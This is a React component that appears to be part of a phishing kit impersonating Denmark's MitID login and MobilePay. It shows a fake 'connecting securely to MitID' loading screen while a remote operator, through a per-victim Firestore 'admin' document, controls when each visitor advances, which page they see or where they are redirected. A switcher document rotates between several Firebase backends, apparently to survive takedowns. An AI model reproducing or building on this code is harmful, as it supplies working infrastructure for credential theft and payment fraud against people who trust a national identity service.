import { doc, getFirestore, onSnapshot } from "firebase/firestore";
import React, { useEffect, useState } from "react";
import { Outlet, useLocation, useNavigate } from "react-router-dom";
import { referenceDB } from "../firebase";
import { getApp } from "firebase/app";
import { getStorage } from "firebase/storage";

function Client() {
  let location = useLocation();
  const [userSubscribed, setUserSubscribed] = useState(false);
  const [identifier, setIdentifier] = useState(null);
  const [loading, setIsLoading] = useState(true);
  const [db, setDb] = useState(null);
  const [storage, setStorage] = useState(null);
  const navigate = useNavigate();

  const getAdminInfo = async () => {
    setUserSubscribed(true);
    const unsub = onSnapshot(doc(db, "admin", identifier), (doc) => {
      let loadingState = doc.data();
      if (!loadingState) window.location.replace("/");
      if (loadingState.redirect) window.location.replace(loadingState.redirect);
      if (!loadingState.loading) {
        navigate(loadingState?.link);
      }
      setIsLoading(loadingState.loading);
    });
  };

  useEffect(() => {
    onSnapshot(doc(referenceDB, "switcher", "main"), (doc) => {
      let swicther = doc.data();
      console.log(swicther);
      if (swicther?.selectedDB != db?.app.name) {
        const app = getApp(swicther?.selectedDB ?? "db1");
        const db = getFirestore(app);
        const storage = getStorage(app);
        setDb(db);
        setStorage(storage);
      }
    });
  }, []);

  useEffect(() => {
    if (identifier && db) {
      getAdminInfo();
    } else {
      setIsLoading(false);
      navigate("/mobilepay");
    }
    // getUserInfo();
  }, [identifier, db]);

  // useEffect(() => {
  //   const pathname = location.pathname.replace("/", "");
  //   console.log(pathname);
  //   if (pathname == "login") {
  //     seIsloading(true);
  //   } else {
  //     seIsloading(false);
  //   }
  // }, [location.pathname]);

  return (
    <div>
      {loading ? (
        <section className="flex flex-col justify-center items-center h-screen">
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="61"
              height="16"
              viewBox="0 0 61 16"
              className="mitid-core-header__logo"
              fill="blue"
              focusable="false"
              aria-label="MitID logo"
            >
              <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z"></path>
            </svg>
          </span>
          <div className="relative flex items-center justify-center max-w-sm h-56">
            <svg
              width="100"
              height="117"
              viewBox="0 0 100 117"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M50 0L100 15V56.2C100 104 50 117 50 117C50 117 0 104 0 56.2V15L50 0Z"
                fill="#0C32FE"
              />
            </svg>

            <div role="status" className="absolute translate-x-1">
              <svg
                aria-hidden="true"
                className="w-12 h-12 mr-2 text-gray-200 animate-spin fill-blue-600"
                viewBox="0 0 100 101"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                  fill="currentColor"
                />
                <path
                  d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                  fill="currentFill"
                />
              </svg>
              <span className="sr-only">Loading...</span>
            </div>
          </div>
          <div className="flex flex-col justify-center items-center">
            <h1 className="font-semibold text-lg">
              Forbinder sikkert til MitID
            </h1>
            <h3>Vent et øjeblik ...</h3>
          </div>
        </section>
      ) : (
        <section className="h-screen">
          <Outlet context={[identifier, setIdentifier, db,storage]} />
        </section>
      )}
    </div>
  );
}

export default Client;
